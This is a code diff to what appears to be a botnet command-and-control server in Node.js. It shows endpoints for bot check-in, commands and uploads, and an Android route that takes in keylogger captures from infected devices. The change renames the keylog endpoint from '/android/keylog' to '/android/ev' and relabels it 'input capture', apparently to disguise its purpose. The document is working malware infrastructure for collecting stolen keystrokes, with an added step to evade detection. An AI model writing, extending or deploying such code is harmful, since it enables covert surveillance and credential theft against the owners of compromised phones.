@@ -9,7 +9,7 @@ const { spawn } = require("child_process");
  *   GET /checkin, GET /cmd, GET /result, POST /upload
  *
  * This file adds only what's Android-specific:
- *   POST /android/keylog?id=<id>   — bulk keylog text upload
+ *   POST /android/ev?id=<id>        — bulk input capture upload
  *   GET  /api/android/agents       — list Android-only bots (admin)
  */
 
@@ -28,7 +28,7 @@ const router = express.Router();
 
 // ── keylog upload ─────────────────────────────────────────────────────────────
 
-router.post("/android/keylog", express.text({ limit: "256kb", type: "text/plain" }), (req, res) => {
+router.post("/android/ev", express.text({ limit: "256kb", type: "text/plain" }), (req, res) => {
     if (!botAuthed(req)) return res.status(403).send("");
     const id = req.query.id;
     if (!id) return res.status(400).send("");
@@ -46,7 +46,7 @@ router.post("/android/keylog", express.text({ limit: "256kb", type: "text/plain"
         bot.files.push(fname);
         bot.results.push({ time: new Date().toISOString(), data: `[keylog] ${fname} (${text.length} chars)` });
         persist.scheduleSave();
-        console.log(`[android/keylog]  bot=${id}  ${text.length} chars → ${fname}`);
+        console.log(`[android/ev]  bot=${id}  ${text.length} chars → ${fname}`);
     }
 
     res.status(200).send("");
